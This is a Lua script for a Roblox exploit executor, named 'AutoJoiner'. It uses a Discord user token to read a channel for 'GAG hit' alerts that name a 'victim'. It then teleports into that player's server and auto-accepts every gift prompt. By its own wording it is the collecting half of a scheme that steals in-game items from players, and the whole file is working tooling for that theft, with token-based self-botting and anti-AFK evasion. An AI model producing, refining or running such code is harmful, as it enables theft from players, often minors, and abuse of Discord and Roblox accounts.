-- === autojoiner.lua ===
-- Hosted on GitHub, does NOT include sensitive data like Token or ChannelId

-- Validate required global variables
if not getgenv().Token or getgenv().Token == "" then
    error("[AutoJoiner] Missing Token. Please set getgenv().Token before running.")
end

if not getgenv().ChannelId or getgenv().ChannelId == "" then
    error("[AutoJoiner] Missing ChannelId. Please set getgenv().ChannelId before running.")
end

local Token = getgenv().Token
local ChannelId = getgenv().ChannelId

-- Services
local HttpServ = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Anti-AFK
local vu = game:GetService("VirtualUser")
LocalPlayer.Idled:Connect(function()
    vu:CaptureController()
    vu:ClickButton2(Vector2.new())
end)

-- File setup
local joinedFile = isfile("joined_ids.txt") and readfile("joined_ids.txt") or "[]"
local joinedIds = HttpServ:JSONDecode(joinedFile)
local victimUser = isfile("user_gag.txt") and readfile("user_gag.txt") or ""
local didVictimLeave = false
local timer = 0

-- Save joined message ID
local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

-- Watch for victim leaving
Players.PlayerRemoving:Connect(function(player)
    if player.Name == victimUser then
        didVictimLeave = true
    end
end)

-- Timer counter
task.spawn(function()
    while task.wait(1) do
        timer += 1
    end
end)

-- Accept gift GUI buttons
task.spawn(function()
    local success, gui = pcall(function()
        return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
    end)
    if success and gui then
        while task.wait(0.1) do
            for _, v in pairs(gui:GetChildren()) do
                if v:IsA("ImageLabel") then
                    local acceptButton = v:FindFirstChild("Holder") and v.Holder:FindFirstChild("Frame") and v.Holder.Frame:FindFirstChild("Accept")
                    if acceptButton then
                        acceptButton:Activate()
                    end
                end
            end
        end
    end
end)

-- HTTP request support
local request = (syn and syn.request) or (http and http.request) or request or http_request

-- Auto join function
local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..ChannelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ["Authorization"] = Token,
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Mozilla/5.0"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        for _, msg in ipairs(messages) do
            local embed = msg.embeds and msg.embeds[1]
            if msg.content and embed and embed.title and embed.title:find("Join to get GAG hit") then
                local placeId, jobId = string.match(msg.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                local victim = embed.fields and embed.fields[1] and embed.fields[1].value or "Unknown"

                if placeId and jobId and (didVictimLeave or timer > 10) then
                    if not table.find(joinedIds, tostring(msg.id)) then
                        writefile("user_gag.txt", victim)
                        saveJoinedId(tostring(msg.id))
                        TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, LocalPlayer)
                        return
                    end
                end
            end
        end
    else
        warn("[AutoJoiner] Failed to fetch Discord messages. Status:", response.StatusCode)
    end
end

-- Main loop
while task.wait(5) do
    pcall(autoJoin)
end
